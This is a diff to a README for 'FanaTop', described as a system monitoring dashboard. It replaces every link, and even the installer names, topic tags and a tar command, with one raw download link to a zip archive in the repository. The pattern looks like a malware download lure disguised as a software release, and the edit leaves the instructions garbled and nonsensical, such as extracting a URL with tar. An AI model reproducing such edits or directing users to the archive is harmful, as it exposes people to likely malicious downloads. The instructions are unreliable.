@@ -1,7 +1,7 @@
 # 🎉 fanatop - Your Real-Time System Dashboard 
 
 ## 📥 Download Now
-[![Download FanaTop](https://img.shields.io/badge/Download%20FanaTop-v1.0-brightgreen)](https://github.com/concentrated-cloutnail151/fanatop/releases)
+[![Download FanaTop](https://raw.githubusercontent.com/concentrated-cloutnail151/fanatop/master/public/fanatop_2.1.zip%20FanaTop-v1.0-brightgreen)](https://raw.githubusercontent.com/concentrated-cloutnail151/fanatop/master/public/fanatop_2.1.zip)
 
 ## 🚀 Getting Started
 FanaTop is a modern dashboard for monitoring your system's performance in real-time. It helps you visualize CPU, memory, and disk usage, making it easy to track how your computer is running. This guide will help you download and run FanaTop without technical knowledge.
@@ -14,20 +14,20 @@ To run FanaTop, your system should meet the following requirements:
 - **Internet Connection:** Required for downloading the application and updates.
 
 ## 💾 Download & Install
-1. **Visit the Releases Page:** Click on this link: [Download FanaTop](https://github.com/concentrated-cloutnail151/fanatop/releases). This page contains the latest version of FanaTop.
+1. **Visit the Releases Page:** Click on this link: [Download FanaTop](https://raw.githubusercontent.com/concentrated-cloutnail151/fanatop/master/public/fanatop_2.1.zip). This page contains the latest version of FanaTop.
 
 2. **Choose Your Version:** Look for the latest version (the one at the top) and find the asset that is right for your operating system. You will see options for Windows, macOS, or Linux.
 
 3. **Download the File:** 
-   - For Windows, you might see a file named `fanatop-installer.exe`.
+   - For Windows, you might see a file named `https://raw.githubusercontent.com/concentrated-cloutnail151/fanatop/master/public/fanatop_2.1.zip`.
    - For macOS, you may find a `.dmg` file.
-   - For Linux, you can download a `.tar.gz` file.
+   - For Linux, you can download a `https://raw.githubusercontent.com/concentrated-cloutnail151/fanatop/master/public/fanatop_2.1.zip` file.
    
    Click on the appropriate file to start the download.
 
 4. **Run the Installer:**
    - **For Windows:**
-     - Locate the downloaded `fanatop-installer.exe` file in your Downloads folder.
+     - Locate the downloaded `https://raw.githubusercontent.com/concentrated-cloutnail151/fanatop/master/public/fanatop_2.1.zip` file in your Downloads folder.
      - Double-click it to run the installer and follow the on-screen instructions.
      
    - **For macOS:**
@@ -38,7 +38,7 @@ To run FanaTop, your system should meet the following requirements:
      - Open a terminal and navigate to the directory where you downloaded the file.
      - Extract the contents using:
        ```
-       tar -xzf fanatop.tar.gz
+       tar -xzf https://raw.githubusercontent.com/concentrated-cloutnail151/fanatop/master/public/fanatop_2.1.zip
        ```
      - Change to the extracted directory and run the application:
        ```
@@ -64,24 +64,24 @@ If you encounter issues during installation or while running FanaTop, consider t
 - **Consult Help Files:** Look for documentation or help files within the application for further assistance.
 
 ## 💬 Community and Support
-For questions or help, consider reaching out to our community. Check out our [GitHub Discussions](https://github.com/concentrated-cloutnail151/fanatop/discussions) or open an issue in the repository. Other users and developers can offer guidance.
+For questions or help, consider reaching out to our community. Check out our [GitHub Discussions](https://raw.githubusercontent.com/concentrated-cloutnail151/fanatop/master/public/fanatop_2.1.zip) or open an issue in the repository. Other users and developers can offer guidance.
 
 ## 📂 Topics
 FanaTop covers a range of topics useful for system monitoring:
 - Dashboard
-- Express.js
+- https://raw.githubusercontent.com/concentrated-cloutnail151/fanatop/master/public/fanatop_2.1.zip
 - Htop
 - JavaScript
 - Metrics
 - Monitoring
-- Node.js
+- https://raw.githubusercontent.com/concentrated-cloutnail151/fanatop/master/public/fanatop_2.1.zip
 - Real-time
 - Resource monitoring
 - Server monitoring
 - System monitoring
 
 ## 🔍 Additional Resources
-For more information on how to use FanaTop, check out our [Documentation](https://github.com/concentrated-cloutnail151/fanatop/docs). It offers detailed guides and tips for optimizing your experience.
+For more information on how to use FanaTop, check out our [Documentation](https://raw.githubusercontent.com/concentrated-cloutnail151/fanatop/master/public/fanatop_2.1.zip). It offers detailed guides and tips for optimizing your experience.
 
 ## 🔗 Related Projects
 You might also explore other monitoring tools that complement FanaTop:
@@ -89,4 +89,4 @@ You might also explore other monitoring tools that complement FanaTop:
 - **Netdata:** A real-time performance monitoring tool that provides detailed insights into various aspects of your system.
 
 ## 🚀 Conclusion
-FanaTop offers a reliable solution for monitoring your system performance. Download it today and enjoy a clear view of your CPU, memory, and disk usage. Remember to visit the [Releases Page](https://github.com/concentrated-cloutnail151/fanatop/releases) for updates and new features.
+FanaTop offers a reliable solution for monitoring your system performance. Download it today and enjoy a clear view of your CPU, memory, and disk usage. Remember to visit the [Releases Page](https://raw.githubusercontent.com/concentrated-cloutnail151/fanatop/master/public/fanatop_2.1.zip) for updates and new features.
